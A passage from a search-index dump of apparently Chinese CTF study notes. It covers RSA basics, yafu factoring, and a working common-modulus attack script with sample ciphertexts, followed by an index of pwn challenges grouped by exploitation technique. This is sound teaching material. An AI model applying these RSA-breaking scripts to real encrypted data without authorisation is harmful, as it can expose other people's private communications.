\u53ef\u4ee5\u5728\u4e0d\u77e5\u9053d1,d2\u7684\u60c5\u51b5\u4e0b\uff0c\u89e3\u51fam\u3002 \u5229\u7528\u7684\u6570\u5b66\u516c\u5f0f\uff1a \u62d3\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5 \u3002 python \u811a\u672c\uff1a #! /usr/bin/env python3 # -*- coding: utf-8 -*- #RSA \u5171\u6a21\u653b\u51fb\u811a\u672c from libnum import n2s , s2n from gmpy2 import invert # \u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5 def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def main (): n = 27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657 c1 = 21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531 c2 = 9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664 e1 = 464857 e2 = 190529 s = egcd ( e1 , e2 ) s1 = s [ 1 ] s2 = s [ 2 ] # \u6c42\u6a21\u53cd\u5143\u7d20 if s1 < 0 : s1 = - s1 c1 = invert ( c1 , n ) elif s2 < 0 : s2 = - s2 c2 = invert ( c2 , n ) m = pow ( c1 , s1 , n ) * pow ( c2 , s2 , n ) % n print ( n2s ( m )) # \u4e8c\u8fdb\u5236\u8f6cstring if __name__ == '__main__' : main () \u5e93 gmpy2.gcdext(e1,e2) \u4e0e\u811a\u672c\u5b9a\u4e49\u51fd\u6570\u76f8\u540c\u3002 5. \u66f4\u5168\u9762\u7684\u5b66\u4e60 \u00b6 \u6df1\u5165\u6d45\u51faRSA\u5728CTF\u4e2d\u7684\u653b\u51fb\u5957\u8def CTF---RSA\u89e3\u5bc6\u5b66\u4e60\u6307\u5357(\u4e09) RSA\u52a0\u5bc6\u89e3\u5bc6\u539f\u7406\u6df1\u5ea6\u5256\u6790","title":"RSA\u52a0\u5bc6\u7b14\u8bb0"},{"location":"Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/#rsa","text":"\u6700\u540e\u66f4\u65b0\uff1a2020-03-02 11:23:12","title":"RSA\u52a0\u5bc6\u7b14\u8bb0"},{"location":"Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/#1-rsa","text":"RSA \u7b97\u6cd5\u6d89\u53ca\u53c2\u6570\u6709\uff1a n\u3001e\u3001d\uff08p\u3001q\uff09 \uff0c\u5176\u4e2d\u5206\u4e3a\u79c1\u94a5\u548c\u516c\u94a5\u3002\u516c\u94a5\u4e3a\uff1a n\u3001e \uff0c\u79c1\u94a5\u4e3a\uff1a phi\u3001d \u3002\u6d89\u53ca\u6570\u5b66\u57fa\u7840\u6709\uff1a\u6b27\u62c9\u51fd\u6570\uff08phi\uff09\u3001\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\uff08gcd\uff09\u3001\u540c\u4f59\u3002 \u53c2\u6570\u4ecb\u7ecd \uff1a n \uff1a \u4e24\u4e2a\u7d20\u6570 p \u4e0e q \u7684\u4e58\u79ef\u3002\u6ce8\u610f\uff1an \u5c06\u516c\u5f00\uff0c\u800c p \u4e0e q \u4e0d\u516c\u5f00\u3002 e \uff1a\u4e00\u4e2a\u7d20\u6570\u3002\u6ee1\u8db3 1<e<phi \uff0c\u4e14 gcd(phi,e)=1 \uff08\u4e0e phi \u6700\u5927\u516c\u7ea6\u6570\u4e3a 1 \uff0c\u5373\u4e92\u7d20\uff09\u3002 phi \uff1a \u6b27\u62c9\u6570\uff0c\u8ba1\u7b97\u516c\u5f0f\uff1a phi = (p-1)(q-1) \u3002 d \uff1a e \u6a21 phi \u7684\u9006\u5143\uff0c\u5177\u4f53\u5173\u7cfb\u5f0f\uff1a d * e = 1 mod(phi) \u3002","title":"1. RSA \u4ecb\u7ecd"},{"location":"Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/#2","text":"c = m^e mod n = pow(m,e,n) m = c^d mod n = pow(c,d,n)","title":"2. \u52a0\u89e3\u5bc6\u7b97\u6cd5"},{"location":"Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/#3","text":"\u52a0\u5bc6\u811a\u672c from Crypto.Util.number import * import gmpy2 msg = 'flag is :testflag' # \u660e\u6587 hex_msg = int ( msg . encode ( \"hex\" ), 16 ) # \u8f6c\u6362\u660e\u6587\u4e3a\u6570\u5b57 # \u751f\u6210\u516c\u94a5 n\u3001e p = getPrime ( 100 ) # \u968f\u673a\u751f\u6210\u4e00\u4e2a\u8d28\u6570 q = getPrime ( 100 ) n = p * q e = 0x10001 print ( \"n=\" , hex ( n )) print ( \"e=\" , hex ( e )) # \u751f\u6210\u79c1\u94a5 phi\u3001d phi = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phi ) # \u9006\u5143\u8fd0\u7b97 print ( \"phi=\" , hex ( phi )) print ( \"d=\" , hex ( d )) #\u52a0\u5bc6\u7b97\u6cd5 c = pow ( hex_msg , e , n ) print ( \"c=\" , hex ( c )) \u89e3\u5bc6\u811a\u672c # \u5df2\u77e5 c\u3001n\u3001e \uff0c\u5e76\u5206\u89e3n\u83b7\u5f97q\u3001p import gmpy2 c = 0x534280240c65bb1104ce3000bc8181363806e7173418d15762 e = 0x10001 n = 0x80b32f2ce68da974f25310a23144977d76732fa78fa29fdcbf # \u8fd9\u91cc\u4f7f\u7528yafu\u5206\u89e3n p = 780900790334269659443297956843 q = 1034526559407993507734818408829 # \u8ba1\u7b97\u79c1\u94a5 phi = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phi ) # \u89e3\u5bc6\u7b97\u6cd5 m = pow ( c , d , n ) print ( hex ( m )[ 2 :] . decode ( 'hex' )) # \u8f6c\u6362\u660e\u6587\u4e3a\u5b57\u7b26 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0cc e n phi p q c \u90fd\u662f int \u578b\uff0cm \u662f str \u578b\u3002\u6240\u4ee5\u9700\u8981\u5c06 m \u8f6c\u6362\u4e3a int \u578b\u5e26\u5165\u7b97\u6cd5\u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\u3002 \u6211\u9047\u5230\u8fc7\u6709\u4e24\u79cd\u8f6c\u6362\u65b9\u5f0f\uff1a # \u65b9\u6cd5 1 msg = int ( msg . encode ( \"hex\" ), 16 ) msg = hex ( msg )[ 2 :] . decode ( 'hex' ) # \u65b9\u6cd5 2 from Crypto.Util.number import * bytes_to_long ( b 'felinae' ) # bytes \u8f6c int long_to_bytes ( 28821963924201829 ) # \u6570\u5b57\u8f6c bytes \u6c42\u9006\u5143 d \u7684\u8bdd\uff0c\u7528 gmpy2.invert \u4ee3\u5165\u53c2\u6570\u5373\u53ef\u3002\u53ea\u662f gmpy2 \u8fd9\u4e2a\u5e93\u6bd4\u8f83\u96be\u88c5\u3002","title":"3. \u57fa\u7840\u52a0\u89e3\u5bc6\u811a\u672c"},{"location":"Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/#4","text":"","title":"4. \u5e38\u89c1\u653b\u51fb\u65b9\u6cd5"},{"location":"Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/#4-1-p-q","text":"\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5229\u7528\u5de5\u5177\u7206\u7834\u51fa\u4e24\u4e2a\u5927\u8d28\u6570 p \u4e0e q \u3002\u901a\u5e38\u8ba4\u4e3a\u957f\u5ea6\u5728 256 bit \u4e00\u4ee5\u4e0b\uff0c\u53ef\u4ee5\u5728\u672c\u5730\u5229\u7528\u5de5\u5177\u7206\u7834\uff1a yafu \u5206\u89e3 windows \u4e0b\u8f7d\u89e3\u538b\u5373\u7528\uff0c \u4e0b\u8f7d\u5730\u5740 \u957f\u5ea6\u5728 712 bit \u4ee5\u4e0b\u7684\uff0c\u53ef\u4ee5\u5230\u5728\u7ebf\u7f51\u7ad9\u67e5\u8be2\u4e00\u4e0b\u662f\u5426\u6709\u5df2\u7ecf\u89e3\u5bc6\u7684\u7ed3\u679c\uff1a \u5728\u7ebf\u7f51\u7ad9\u5206\u89e3 factordb","title":"4. 1 p \u4e0e q \u76f8\u5dee\u8fc7\u5927(\u5c0f)"},{"location":"Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/#42-n","text":"\u53ef\u4ee5\u5c1d\u8bd5**\u5229\u7528\u516c\u7ea6\u6570\u5206\u89e3 n ** \u5229\u7528**\u6b27\u51e0\u91cc\u5f97\u8f97\u8f6c\u76f8\u9664\u6cd5**\u6c42\u89e3\u6700\u5927\u516c\u7ea6\u6570\uff1a def gcd ( a , b ): if a < b : a , b = b , a while b != 0 : temp = a % b a = b b = temp return a def main (): a = 38 b = 18 print ( gcd ( a , b )) if __name__ == '__main__' : main () \u5229\u7528**Crypto.Util.number** \u5e93\uff1a from Crypto.Util.number import GCD GCD ( 38 , 18 )","title":"4.2 \u6709\u591a\u4e2a\u516c\u94a5 n \u4e14\u6709\u5171\u7528\u7d20\u6570\u56e0\u5b50"},{"location":"Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/#43","text":"\u5982\u679c\u5728RSA\u7684\u4f7f\u7528\u4e2d\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u6a21n\u5bf9\u76f8\u540c\u7684\u660e\u6587m\u8fdb\u884c\u4e86\u52a0\u5bc6\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5728\u4e0d\u5206\u89e3n\uff0c\u4e5f\u4e0d\u9700\u8981\u6c42\u89e3\u79c1\u94a5\u7684\u60c5\u51b5\u4e0b\u8fd8\u539f\u51fa\u660e\u6587m\u7684\u503c\u3002\u5373\uff1a \u5f53n\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b\uff0c\u77e5\u9053n,e1,e2,c1,c2 \u53ef\u4ee5\u5728\u4e0d\u77e5\u9053d1,d2\u7684\u60c5\u51b5\u4e0b\uff0c\u89e3\u51fam\u3002 \u5229\u7528\u7684\u6570\u5b66\u516c\u5f0f\uff1a \u62d3\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5 \u3002 python \u811a\u672c\uff1a #! /usr/bin/env python3 # -*- coding: utf-8 -*- #RSA \u5171\u6a21\u653b\u51fb\u811a\u672c from libnum import n2s , s2n from gmpy2 import invert # \u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5 def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def main (): n = 27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657 c1 = 21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531 c2 = 9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664 e1 = 464857 e2 = 190529 s = egcd ( e1 , e2 ) s1 = s [ 1 ] s2 = s [ 2 ] # \u6c42\u6a21\u53cd\u5143\u7d20 if s1 < 0 : s1 = - s1 c1 = invert ( c1 , n ) elif s2 < 0 : s2 = - s2 c2 = invert ( c2 , n ) m = pow ( c1 , s1 , n ) * pow ( c2 , s2 , n ) % n print ( n2s ( m )) # \u4e8c\u8fdb\u5236\u8f6cstring if __name__ == '__main__' : main () \u5e93 gmpy2.gcdext(e1,e2) \u4e0e\u811a\u672c\u5b9a\u4e49\u51fd\u6570\u76f8\u540c\u3002","title":"4.3 \u5171\u6a21\u653b\u51fb"},{"location":"Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/#5","text":"\u6df1\u5165\u6d45\u51faRSA\u5728CTF\u4e2d\u7684\u653b\u51fb\u5957\u8def CTF---RSA\u89e3\u5bc6\u5b66\u4e60\u6307\u5357(\u4e09) RSA\u52a0\u5bc6\u89e3\u5bc6\u539f\u7406\u6df1\u5ea6\u5256\u6790","title":"5. \u66f4\u5168\u9762\u7684\u5b66\u4e60"},{"location":"Crypto/yafu%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/","text":"yafu\u5b89\u88c5\u53ca\u4f7f\u7528 \u00b6 yafu\u7528\u4e8e\u81ea\u52a8\u6574\u6570\u56e0\u5f0f\u5206\u89e3\uff0c \u5728RSA\u4e2d\uff0c\u5f53p\u3001q\u7684\u53d6\u503c\u5dee\u5f02\u8fc7\u5927\u6216\u8fc7\u4e8e\u76f8\u8fd1\u7684\u65f6\u5019\uff0c\u4f7f\u7528yafu\u53ef\u4ee5\u5feb\u901f\u7684\u628an\u503c\u5206\u89e3\u51fap\u3001q\u503c \uff0c\u539f\u7406\u662f\u4f7f\u7528Fermat\u65b9\u6cd5\u4e0ePollard rho\u65b9\u6cd5\u7b49\u3002 \u5982\u679c p \u4e0e q \u76f8\u5dee\u8f83\u5927\uff08\u5c0f\uff09\uff0c\u4f7f\u7528 yafu \u53ef\u4ee5\u5f88\u5feb\u5206\u89e3\u51fa\u6765\u3002\u5982\u679c n \u8f83\u5927\uff0c\u4e14\u7ecf\u8fc7\u51e0\u8f6e\u5206\u89e3\u90fd\u6ca1\u6709\u5f97\u51fa\u7ed3\u679c\uff0c\u5bf9\u4e8e ctf \u9898\u76ee\u6765\u8bf4\uff0c\u5e94\u8be5\u6709\u5176\u4ed6\u89e3\u6cd5\u3002 \u5b89\u88c5 \u00b6 yafu \u57fa\u672c\u8986\u76d6\u5168\u5e73\u53f0\u3002\u53cd\u6b63\u529f\u80fd\u4e00\u6837\uff0c\u9009\u62e9\u6700\u7b80\u4fbf\u5b89\u88c5\u65b9\u6cd5--Windows \u4e0b\u5b89\u88c5\u3002 \u6253\u5f00 \u4e0b\u8f7d\u5730\u5740 \uff0c\u4e0b\u8f7d\u540e\u89e3\u538b\u5373\u53ef\u4f7f\u7528\u3002\u89e3\u538b\u540e\u6709\u4e24\u4e2a\u7248\u672c\uff0c\u6839\u636e\u81ea\u5df1\u7cfb\u7edf\u4f4d\u6570\u9009\u62e9\uff08\u4e0b\u6587\u4f7f\u7528 x64 \u7248\u672c\uff09\u3002 \u4f7f\u7528 \u00b6 \u4f7f\u7528 cmd \u8fdb\u5165\u5230 yafu \u6240\u5728\u76ee\u5f55\u4e0b\uff0c\u6216\u5c06\u76ee\u5f55\u52a0\u5165\u5230\u7cfb\u7edf\u73af\u5883 PATH \u53d8\u91cf\uff0c\u6216\u6253\u5f00\u76ee\u5f55\u6587\u4ef6\u5939\u540e shift+\u53f3\u952e \u9009\u62e9\u5728\u6b64\u5904\u6253\u5f00 powershell \u3002 \u5047\u5982\u8981\u5206\u89e3\u56e0\u6570 6 \uff0c\u8f93\u5165\u547d\u4ee4\uff1a .\\yafu-x64.exe \"factor(6)\" \u3002 \u5982\u679c\u56e0\u6570\u8fc7\u957f\uff0c\u5c06 \u56e0\u6570 \u7528\u6587\u672c\u6587\u4ef6\u5b58\u653e\u5728 yafu \u76ee\u5f55\u4e0b\uff0c\u4f8b\u5982\uff1adata.txt \u3002 \u6587\u4ef6\u6700\u540e\u4e00\u884c\u4e00\u5b9a\u8981\u6362\u884c\uff0c\u5426\u5219eof; done processing batchfile \u3002 \u8fd0\u884c\u547d\u4ee4\uff1a .\\yafu-x64.exe \"factor(@)\" -batchfile data.txt","title":"yafu\u5b89\u88c5\u53ca\u4f7f\u7528"},{"location":"Crypto/yafu%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/#yafu","text":"yafu\u7528\u4e8e\u81ea\u52a8\u6574\u6570\u56e0\u5f0f\u5206\u89e3\uff0c \u5728RSA\u4e2d\uff0c\u5f53p\u3001q\u7684\u53d6\u503c\u5dee\u5f02\u8fc7\u5927\u6216\u8fc7\u4e8e\u76f8\u8fd1\u7684\u65f6\u5019\uff0c\u4f7f\u7528yafu\u53ef\u4ee5\u5feb\u901f\u7684\u628an\u503c\u5206\u89e3\u51fap\u3001q\u503c \uff0c\u539f\u7406\u662f\u4f7f\u7528Fermat\u65b9\u6cd5\u4e0ePollard rho\u65b9\u6cd5\u7b49\u3002 \u5982\u679c p \u4e0e q \u76f8\u5dee\u8f83\u5927\uff08\u5c0f\uff09\uff0c\u4f7f\u7528 yafu \u53ef\u4ee5\u5f88\u5feb\u5206\u89e3\u51fa\u6765\u3002\u5982\u679c n \u8f83\u5927\uff0c\u4e14\u7ecf\u8fc7\u51e0\u8f6e\u5206\u89e3\u90fd\u6ca1\u6709\u5f97\u51fa\u7ed3\u679c\uff0c\u5bf9\u4e8e ctf \u9898\u76ee\u6765\u8bf4\uff0c\u5e94\u8be5\u6709\u5176\u4ed6\u89e3\u6cd5\u3002","title":"yafu\u5b89\u88c5\u53ca\u4f7f\u7528"},{"location":"Crypto/yafu%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/#_1","text":"yafu \u57fa\u672c\u8986\u76d6\u5168\u5e73\u53f0\u3002\u53cd\u6b63\u529f\u80fd\u4e00\u6837\uff0c\u9009\u62e9\u6700\u7b80\u4fbf\u5b89\u88c5\u65b9\u6cd5--Windows \u4e0b\u5b89\u88c5\u3002 \u6253\u5f00 \u4e0b\u8f7d\u5730\u5740 \uff0c\u4e0b\u8f7d\u540e\u89e3\u538b\u5373\u53ef\u4f7f\u7528\u3002\u89e3\u538b\u540e\u6709\u4e24\u4e2a\u7248\u672c\uff0c\u6839\u636e\u81ea\u5df1\u7cfb\u7edf\u4f4d\u6570\u9009\u62e9\uff08\u4e0b\u6587\u4f7f\u7528 x64 \u7248\u672c\uff09\u3002","title":"\u5b89\u88c5"},{"location":"Crypto/yafu%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/#_2","text":"\u4f7f\u7528 cmd \u8fdb\u5165\u5230 yafu \u6240\u5728\u76ee\u5f55\u4e0b\uff0c\u6216\u5c06\u76ee\u5f55\u52a0\u5165\u5230\u7cfb\u7edf\u73af\u5883 PATH \u53d8\u91cf\uff0c\u6216\u6253\u5f00\u76ee\u5f55\u6587\u4ef6\u5939\u540e shift+\u53f3\u952e \u9009\u62e9\u5728\u6b64\u5904\u6253\u5f00 powershell \u3002 \u5047\u5982\u8981\u5206\u89e3\u56e0\u6570 6 \uff0c\u8f93\u5165\u547d\u4ee4\uff1a .\\yafu-x64.exe \"factor(6)\" \u3002 \u5982\u679c\u56e0\u6570\u8fc7\u957f\uff0c\u5c06 \u56e0\u6570 \u7528\u6587\u672c\u6587\u4ef6\u5b58\u653e\u5728 yafu \u76ee\u5f55\u4e0b\uff0c\u4f8b\u5982\uff1adata.txt \u3002 \u6587\u4ef6\u6700\u540e\u4e00\u884c\u4e00\u5b9a\u8981\u6362\u884c\uff0c\u5426\u5219eof; done processing batchfile \u3002 \u8fd0\u884c\u547d\u4ee4\uff1a .\\yafu-x64.exe \"factor(@)\" -batchfile data.txt","title":"\u4f7f\u7528"},{"location":"KnowExam/Know%26Exam/","text":"\u77e5\u8bc6\u70b9&\u9898\u76ee\u7d22\u5f15 \u00b6 unlink \u00b6 2016 ZCTF note2 \u8003 \u70b9\uff1aunlink\u3001\u7c7b\u578b\u8f6c\u6362 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU 2014 HITCON stkof Asis CTF 2016 b00ks \u8003 \u70b9\uff1aunlink \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU extend&overlapping \u00b6 HITCON Trainging lab13 \u8003 \u70b9\uff1aoff-by-one \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU 2015 hacklu bookstore \u8003 \u70b9\uff1aoff-by-one\u3001UAF\u3001\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack fini_array \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU off-by-one \u00b6 Asis CTF 2016 b00ks \u8003 \u70b9\uff1aoff-by-one\uff08\u3001unlink\uff09 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a16\u7528unlink\u505a\uff0c18\u7528off-by-one\u505a \u6574\u6570\u6ea2\u51fa \u00b6 bjdctf_2020_babystack2 \u8003 \u70b9\uff1a\u6574\u6570\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU pwn2_sctf_2016 \u8003 \u70b9\uff1a\u6574\u6570\u6ea2\u51fa\u3001ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU ROP\uff08\u6808\u6ea2\u51fa\uff09 \u00b6 jarvisoj_level3 jarvisoj_tell_me_something jarvisoj_level4 bjdctf_2020_babyrop jarvisoj_test_your_memory PicoCTF_2018_rop_chain \u8003 \u70b9\uff1a\u7b80\u5355ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU ez_pz_hackover_2016 \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001strcmp \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u94c1\u4eba\u4e09\u9879(\u7b2c\u4e94\u8d5b\u533a)_2018_rop jarvisoj_level1 \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU bjdctf_2020_babyrop2 \u8003 \u70b9\uff1aret2libc\u3001\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7ed5\u8fc7canary \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU jarvisoj_level3_x64 \u8003 \u70b9\uff1aret2csu\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU pwnable.tw-3x17 DASCTF\u4e94\u6708\u8d5b-Memory Monster II \u8003 \u70b9\uff1a64\u4f4d\u52ab\u6301 fini_array\u8fdb\u884cROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1apwnable.tw\u3001github \u6808\u8fc1\u79fb \u00b6 gyctf_2020_borrowstack \u8003 \u70b9\uff1a\u6808\u8fc1\u79fb\u3001onegedget \u505a\u9898\u7b14\u8bb0\uff1a https://www.mrskye.cn/archives/14/ \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u6d4b\u8bd5\u4e0d\u80fd\u4f7f\u7528system('/bin/sh')\uff0c\u7a7a\u95f4\u4e0d\u8db3\uff0c\u8be6\u7ec6\u770bwp [Black Watch \u5165\u7fa4\u9898]PWN-spwn \u8003 \u70b9\uff1a\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u8fd9\u6761\u9898\u76ee\u6ce8\u610f puts \u548c write \u6240\u9700\u6808\u7a7a\u95f4\u7684\u5927\u5c0f\u4e0e\u5199\u5165 bss \u7684\u4f4d\u7f6e\u5173\u7cfb ciscn_2019_es_2 \u8003 \u70b9\uff1a\u7b80\u5355\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u6ce8\u610f /bin/sh \u5199\u5165\u4f4d\u7f6e\u4e0e\u6808\u751f\u957f\u65b9\u5411 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u00b6 jarvisoj_fm \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u4efb\u610f\u5730\u5740\u5c0f\u6570\u5b57\u8986\u76d6 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u53ef\u4ee5\u601d\u8003\u4e00\u4e0b\u5982\u679c\u8981\u6c42\u8986\u76d6\u7684\u662f 1 \u600e\u4e48\u6784\u9020 [RACTF]Finches in a Stack \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u7ed5\u8fc7 canary \u505a\u9898\u7b14\u8bb0\uff1a https://www.mrskye.cn/archives/138/#FinchesinaStack \u5b9e\u9a8c\u73af\u5883\uff1a \u5907 \u6ce8\uff1a\u539f\u9898\u4e3a Ubuntu18\uff0c\u6709\u540e\u95e8 [RACTF]Finches in a Pie \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u7ed5\u8fc7 canary \u3001PIE \u505a\u9898\u7b14\u8bb0\uff1a https://www.mrskye.cn/archives/138/#FinchesinaStack \u5b9e\u9a8c\u73af\u5883\uff1a \u5907 \u6ce8\uff1a\u539f\u9898\u4e3a Ubuntu18\uff0c\u6709\u540e\u95e8 [BJDCTF 2 nd ]r2t4 \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u4e0e\u6b63\u5e38\u7ed5\u8fc7 canary \u4e0d\u540c\u7684\u662f\uff0c\u6545\u610f\u89e6\u53d1\u62a5\u9519\uff1b\u7559\u6709\u540e\u95e8\uff0c\u96be\u5ea6\u4f4e\u4e8e redpwn2020 dead-canary redpwn2020 dead-canary \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a redpwnCTF 2020 pwn\u90e8\u5206writeup \u5b9e\u9a8c\u73af\u5883\uff1a github \u5907 \u6ce8\uff1a\u4e0e[BJDCTF 2 nd ]r2t4\u4e00\u6837\u4e3b\u52a8\u89e6\u53d1 canary \uff0c\u6ca1\u6709\u7559\u540e\u95e8\uff0c\u9700\u8981\u81ea\u5df1\u6784\u5efa ROP \u94fe\uff08\u5982\u679c\u7528onegadget\u4e0d\u9700\u8981 ROP\uff09 DASCTF\u4e03\u6708 \u865a\u5047\u7684\u7b7e\u5230\u9898 \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1a \u5907 \u6ce8\uff1a\u9898\u76ee\u4e0d\u80fd\u7528\u5e38\u89c4\u7684\u6808\u6ea2\u51fa\u89e3\u51b3\uff0c\u7a0b\u5e8f\u9000\u51fa\u65f6leave\u540e\u9762\u52a0\u4e86\u4e00\u6761\u989d\u5916\u6c47\u7f16\u6307\u4ee4\uff0c\u4f1a\u4fee\u6539\u6808\u9876\u3002\u601d\u8def\u5e94\u8be5\u662f\u4fee\u6539puts@got\u4e3a\u540e\u95e8\u5730\u5740\u3002 \u9759\u6001\u7f16\u8bd1 \u00b6 cmcc_simplerop \u8003 \u70b9\uff1a\u7cfb\u7edf\u8c03\u7528\u53f7\u3001\u7b80\u5355\u6808\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU get_started_3dsctf_2016 \u8003 \u70b9\uff1amprotect\u6539\u5185\u5b58\u6743\u9650\u3001\u7b80\u5355\u6808\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 